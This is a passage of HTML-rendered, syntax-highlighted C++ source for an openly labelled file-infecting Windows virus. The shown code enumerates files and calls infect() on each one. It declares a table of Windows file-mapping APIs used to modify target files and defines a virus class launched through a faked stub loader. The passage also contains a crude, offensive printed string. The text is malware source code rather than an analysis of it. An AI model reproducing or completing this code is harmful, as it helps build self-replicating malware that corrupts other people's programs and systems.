                        </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">datas</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fileresult</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">datas</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc1">/*
         *  The Api Table
         *
         ******************/</span><span class="sc0">

        </span><span class="sc11">iLoadLibraryA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">LoadLibraryA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iFindFirstFileA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindFirstFileA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iFindNextFileA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindNextFileA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iOutputDebugStringA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">OutputDebugStringA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iCreateFileA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CreateFileA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iCreateFileMappingA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CreateFileMappingA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iMapViewOfFile</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iUnmapViewOfFile</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iCloseHandle</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CloseHandle</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">iGetFileSize</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">// functions
</span><span class="sc0">
        </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">missed</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">FileMapping</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MapAddress</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">VirCode</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">// This creates an instance of object virus on the stack, and then calls the 
// virus.  The global variable inside the class will be taken from the stack
// and not from data
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">start</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ImageBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">viruslocation</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">virus</span><span class="sc0"> </span><span class="sc11">A</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">A</span><span class="sc10">.</span><span class="sc11">start_virus</span><span class="sc10">(</span><span class="sc11">ImageBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">viruslocation</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// this will fake the stub loader and call our virus
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vir_size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">start</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc4">0x00400000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc4">0x00401000</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"welcome to the Gaybar: %i\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span></div></body>
</html>
